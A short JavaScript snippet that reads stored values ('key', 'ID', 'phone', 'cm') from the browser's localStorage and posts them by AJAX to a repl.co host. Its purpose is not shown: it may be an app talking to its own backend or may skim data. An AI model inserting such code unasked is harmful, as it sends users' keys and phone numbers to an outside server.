const key = localStorage.getItem("key")
const hi = localStorage.getItem("ID")
const pn = localStorage.getItem("phone")
const cms = localStorage.getItem('cm')
$.ajax({
    type: 'POST',
    url: 'https://SorrowfulVerifiableAdaware.programmerboi.repl.co/r',
    crossDomain: true,
    data: 
    {
        'name': hi,
        'phone': pn,
        'key': key,
        'cms': cms,
    },
    dataType: 'json',
    success: function(responseData, textStatus, jqXHR) {
        var value = responseData
        console.log(value+'::'+ textStatus+':::'+jqXHR);
    },
    error: function (responseData, textStatus, errorThrown) {
        console.log(errorThrown+ '::' + textStatus +':' + responseData)
    }
});